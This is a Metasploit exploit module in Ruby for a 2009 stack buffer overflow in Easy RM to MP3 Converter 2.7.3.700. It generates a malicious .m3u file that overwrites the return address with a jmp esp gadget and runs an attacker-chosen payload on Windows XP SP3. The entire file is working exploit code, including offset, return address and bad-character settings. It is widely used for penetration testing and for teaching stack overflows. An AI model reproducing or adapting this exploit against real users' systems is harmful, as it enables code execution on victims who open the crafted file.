##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
		                  'Name'           => 'Easy RM to MP3 Converter 2.7.3.700 Stack Buffer Overflow',
		                  'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Easy RM to MP3
				Converter 2.7.3.700, when handling "m3u" files. An attacker must send the file to
				victim and the victim must open the file.
			},
		                  'License'        => MSF_LICENSE,
		                  'Author'         => [
				                  'Crazy_Hacker', # Vulnerability Discovery
				                  'corelanc0d3r', # Exploit tutorial
				                  'Redsadic <julian.vilas[at]gmail.com>', # Metasploit module
		                  ],
		                  'References'     =>
				                  [
						                  [ 'URL', 'http://packetstormsecurity.com/files/view/79307/easyrmmp3-overflow.txt' ],
						                  [ 'URL', 'https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/'],
				                  ],
		                  'Payload'        =>
				                  {
						                  'Space'    => 800,
						                  'BadChars' => "\x00\xff\x0a\x0d",
				                  },
		                  'Platform' => 'win',
		                  'Targets'        =>
				                  [
						                  # Tested by redsadic - 20130716 xpsp3
						                  [ 'Windows XP SP3 / Easy RM to MP3 Converter 2.7.3.700', { 'Ret' => 0x01cd39b4 , 'Offset' => 26070 } ], # jmp esp at MSRMCcodec02.dll
				                  ],
		                  'Privileged'     => false,
		                  'DisclosureDate' => 'Jul 17 2009',
		                  'DefaultTarget'  => 0))

		register_options(
				[
						OptString.new('FILENAME', [ true, 'The file name.',  'sploit.m3u']),
				], self.class)

	end

	def exploit

		sploit = rand_text(target['Offset']) # junk
		sploit << [target.ret].pack('V')
		sploit << rand_text(4) # adjustment for payload to start at esp
		sploit << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end
end
